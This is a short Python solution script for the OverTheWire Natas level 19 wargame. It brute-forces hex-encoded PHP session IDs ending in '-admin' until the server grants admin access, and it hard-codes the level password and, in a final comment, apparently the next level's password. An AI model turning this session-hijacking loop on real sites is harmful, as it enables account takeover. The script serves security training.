import codecs

import requests


url = "http://natas19.natas.labs.overthewire.org/index.php"
pw = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"


won = "You are an admin"

for i in range(640):
    s = requests.Session()
    s.auth = ('natas19', pw)
    sess_id = str(i) + "-admin"
    sess_id_bytes = sess_id.encode("utf-8")
    print(sess_id_bytes)
    ascii_sess_id = codecs.encode(sess_id_bytes, "hex")
    cookie = {"PHPSESSID": ascii_sess_id.decode("utf-8")}
    #s.cookies = cookie
    r = s.get(url, cookies=cookie)
    if won in r.text:
        print(r.text)
        break

# eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF